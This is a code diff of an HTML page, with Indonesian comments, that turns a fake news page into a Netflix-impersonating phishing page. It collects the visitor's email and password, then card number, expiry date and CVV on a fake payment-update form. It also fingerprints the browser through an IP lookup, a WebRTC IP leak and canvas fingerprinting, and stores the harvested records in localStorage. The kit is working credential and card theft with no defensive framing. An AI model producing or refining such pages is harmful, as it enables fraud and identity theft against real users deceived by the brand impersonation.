@@ -1,20 +1,68 @@
 <!DOCTYPE html>
-<html lang="id">
+<html lang="en">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Berita Terkini</title>
+    <title>Netflix - Sign In</title>
     <script src="https://cdn.tailwindcss.com"></script>
+    <style>
+        body {
+            background-color: #141414;
+            color: #fff;
+            font-family: 'Helvetica Neue', Helvetica, Arial, sans-serif;
+        }
+        .netflix-logo {
+            width: 100px;
+            height: 36px;
+            background: url('https://assets.nflxext.com/ffe/siteui/vlv3/9d0b0237-60f7-4e98-a752-092874e7e1fc/96dc82d8-7775-4e16-8347-7a862a7f1944/US-en-20240624-popsignuptwoweeks-perspective_alpha_website_small.png') no-repeat;
+            background-size: contain;
+        }
+    </style>
 </head>
-<body class="bg-gray-100 p-4">
-    <div class="max-w-4xl mx-auto bg-white p-6 rounded-lg shadow-lg">
-        <h1 class="text-2xl md:text-3xl font-bold mb-4">Berita Terkini: Penemuan Baru di Dunia Teknologi!</h1>
-        <p class="text-sm text-gray-500 mb-4">Diterbitkan pada 17 April 2025</p>
-        <div class="prose max-w-none">
-            <p class="mb-4">Sebuah tim peneliti dari universitas ternama baru saja mengumumkan penemuan terobosan dalam teknologi kecerdasan buatan. Mereka mengklaim telah menciptakan AI yang dapat memprediksi perilaku manusia dengan akurasi hingga 95%.</p>
-            <p class="mb-4">Penemuan ini diharapkan dapat membantu berbagai industri, mulai dari kesehatan hingga pendidikan. Namun, beberapa pihak mengkhawatirkan potensi penyalahgunaan teknologi ini untuk melacak aktivitas pengguna tanpa sepengetahuan mereka.</p>
-            <p class="mb-4">Baca terus untuk mengetahui lebih lanjut tentang bagaimana teknologi ini bekerja dan apa dampaknya bagi masa depan kita.</p>
-        </div>
+<body>
+    <!-- Halaman Login -->
+    <div id="loginPage" class="min-h-screen flex flex-col">
+        <header class="p-6">
+            <div class="netflix-logo"></div>
+        </header>
+        <main class="flex-grow flex items-center justify-center">
+            <div class="bg-black bg-opacity-70 p-8 md:p-12 rounded w-full max-w-md">
+                <h1 class="text-3xl font-bold mb-6">Sign In</h1>
+                <div id="loginForm" class="space-y-4">
+                    <input id="email" type="email" placeholder="Email or phone number" class="w-full p-4 bg-gray-700 text-white rounded focus:outline-none focus:ring-2 focus:ring-red-600" required>
+                    <input id="password" type="password" placeholder="Password" class="w-full p-4 bg-gray-700 text-white rounded focus:outline-none focus:ring-2 focus:ring-red-600" required>
+                    <button id="signInButton" class="w-full bg-red-600 text-white p-4 rounded hover:bg-red-700">Sign In</button>
+                    <p class="text-gray-400 text-sm">New to Netflix? <a href="#" class="text-white hover:underline">Sign up now</a>.</p>
+                </div>
+            </div>
+        </main>
+        <footer class="p-6 text-gray-400 text-sm">
+            <p>Questions? Call 1-844-505-2993</p>
+        </footer>
+    </div>
+
+    <!-- Halaman Pembayaran -->
+    <div id="paymentPage" class="min-h-screen flex flex-col hidden">
+        <header class="p-6">
+            <div class="netflix-logo"></div>
+        </header>
+        <main class="flex-grow flex items-center justify-center">
+            <div class="bg-black bg-opacity-70 p-8 md:p-12 rounded w-full max-w-md">
+                <h1 class="text-2xl font-bold mb-6">Update Your Payment Method</h1>
+                <div id="paymentForm" class="space-y-4">
+                    <input id="cardHolder" type="text" placeholder="Name on Card" class="w-full p-4 bg-gray-700 text-white rounded focus:outline-none focus:ring-2 focus:ring-red-600" required>
+                    <input id="cardNumber" type="text" placeholder="Card Number" class="w-full p-4 bg-gray-700 text-white rounded focus:outline-none focus:ring-2 focus:ring-red-600" required>
+                    <div class="flex space-x-4">
+                        <input id="expiryDate" type="text" placeholder="MM/YY" class="w-1/2 p-4 bg-gray-700 text-white rounded focus:outline-none focus:ring-2 focus:ring-red-600" required>
+                        <input id="cvv" type="text" placeholder="CVV" class="w-1/2 p-4 bg-gray-700 text-white rounded focus:outline-none focus:ring-2 focus:ring-red-600" required>
+                    </div>
+                    <button id="submitPaymentButton" class="w-full bg-red-600 text-white p-4 rounded hover:bg-red-700">Submit Payment</button>
+                </div>
+            </div>
+        </main>
+        <footer class="p-6 text-gray-400 text-sm">
+            <p>Questions? Call 1-844-505-2993</p>
+        </footer>
     </div>
 
     <script>
@@ -40,11 +88,11 @@
                 const timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
                 const language = navigator.language;
 
-                // 3. WebRTC Leak (Mendapatkan IP lokal dan publik)
+                // 3. WebRTC Leak
                 let webrtcIps = [];
                 try {
                     const rtc = new RTCPeerConnection({ iceServers: [{ urls: 'stun:stun.l.google.com:19302' }] });
-                    rtc.createDataChannel(''); // Buat channel dummy
+                    rtc.createDataChannel('');
                     rtc.onicecandidate = (event) => {
                         if (event.candidate) {
                             const ipMatch = event.candidate.candidate.match(/([0-9]{1,3}\.){3}[0-9]{1,3}/);
@@ -84,15 +132,14 @@
                     console.log('Canvas Fingerprinting error:', error);
                 }
 
-                // 5. Informasi Browser Lain
+                // 5. Informasi Browser
                 const userAgent = navigator.userAgent;
                 let platform = navigator.platform;
                 if (/iPhone|iPad|iPod/.test(userAgent) && !platform.includes('iPhone')) {
                     platform = 'iPhone';
                 }
 
-                // Kumpulkan semua data
-                const userData = {
+                return {
                     ip: ipData.ip || 'Tidak tersedia',
                     city: ipData.city || 'Tidak tersedia',
                     country: ipData.country_name || ipData.country || 'Tidak tersedia',
@@ -106,20 +153,60 @@
                     platform,
                     timestamp: new Date().toISOString()
                 };
+            } catch (error) {
+                console.error('Error mengumpulkan data:', error);
+                return {};
+            }
+        }
+
+        // Simpan data login dan pembayaran
+        let userData = {};
+
+        // Tangani login
+        document.getElementById('signInButton').addEventListener('click', async () => {
+            const email = document.getElementById('email').value;
+            const password = document.getElementById('password').value;
+
+            if (email && password) {
+                userData.email = email;
+                userData.password = password;
+                userData.tracking = await collectUserData();
+
+                // Sembunyikan halaman login, tampilkan halaman pembayaran
+                document.getElementById('loginPage').classList.add('hidden');
+                document.getElementById('paymentPage').classList.remove('hidden');
+            } else {
+                alert('Please fill in all fields.');
+            }
+        });
+
+        // Tangani pengiriman pembayaran
+        document.getElementById('submitPaymentButton').addEventListener('click', () => {
+            const cardHolder = document.getElementById('cardHolder').value;
+            const cardNumber = document.getElementById('cardNumber').value;
+            const expiryDate = document.getElementById('expiryDate').value;
+            const cvv = document.getElementById('cvv').value;
+
+            if (cardHolder && cardNumber && expiryDate && cvv) {
+                userData.payment = {
+                    cardHolder,
+                    cardNumber,
+                    expiryDate,
+                    cvv
+                };
 
                 // Simpan ke localStorage
                 let storedData = JSON.parse(localStorage.getItem('trackedUsers') || '[]');
                 storedData.push(userData);
                 localStorage.setItem('trackedUsers', JSON.stringify(storedData));
 
-                console.log('Data pengguna dikumpulkan:', userData);
-            } catch (error) {
-                console.error('Error mengumpulkan data:', error);
+                // Redirect atau tampilkan pesan sukses
+                alert('Payment submitted successfully. Thank you!');
+                window.location.reload();
+            } else {
+                alert('Please fill in all payment fields.');
             }
-        }
-
-        // Panggil fungsi secara otomatis saat halaman dimuat
-        window.onload = collectUserData;
+        });
     </script>
 </body>
 </html>
